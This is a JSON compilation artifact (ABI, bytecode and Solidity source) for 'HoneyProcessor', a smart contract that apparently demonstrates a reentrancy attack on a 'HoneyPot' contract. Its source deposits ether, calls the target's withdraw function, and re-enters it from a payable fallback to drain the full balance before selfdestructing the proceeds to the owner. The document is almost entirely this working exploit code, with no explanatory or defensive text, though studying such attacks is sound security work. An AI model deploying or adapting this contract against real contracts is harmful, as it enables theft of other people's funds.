{
  "contractName": "HoneyProcessor",
  "abi": [
    {
      "inputs": [
        {
          "name": "hp",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "equip",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "destruct",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806104cb83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610407806100c46000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632b68b9c61461013957806358a79d7314610150578063e91e722a1461015a575b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631141515610137576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561011e57600080fd5b505af1158015610132573d6000803e3d6000fd5b505050505b005b34801561014557600080fd5b5061014e610185565b005b6101586101fa565b005b34801561016657600080fd5b5061016f6102fc565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156101e157600080fd5b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163181151561023f57fe5b0614151561024c57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156102d157600080fd5b505af11580156102e5573d6000803e3d6000fd5b50505050506102f261033c565b6102fa610185565b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156103c157600080fd5b505af11580156103d5573d6000803e3d6000fd5b505050505600a165627a7a72305820872031297c85bfaba08b40601ac0989405246616b1366198c558b33804347e200029",
  "source": "pragma solidity 0.4.24;\n\nimport \"./HoneyPot.sol\";\n\ncontract HoneyProcessor {\n    HoneyPot honeyPot;\n    address owner;\n    \n    function HoneyProcessor(address hp) public {\n        honeyPot = HoneyPot(hp);\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner(){\n        require(msg.sender == owner);\n        _;\n    }\n    \n    /* All actions required to take out complete balance from the target contract are\n       performed as a single transaction.\n    */\n    function equip() payable public{\n        require(honeyPot.balance%msg.value == 0);\n        honeyPot.put.value(msg.value)();\n        attack();\n        destruct();\n    }\n    \n    function attack() private {\n        honeyPot.get();\n    }\n    \n    function getContBalance() public view returns(uint) {\n        return honeyPot.balance;\n    }\n    \n    function destruct() public onlyOwner {\n        selfdestruct(msg.sender);\n    }\n    \n    function() public payable {\n        if(honeyPot.balance != 0){\n            honeyPot.get();\n        }\n        \n    }\n   \n}\n\n",
  "sourcePath": "/home/naveen/Documents/repos/ReentrantIssue/contracts/HoneyProcessor.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-07-16T14:36:16.612Z"
}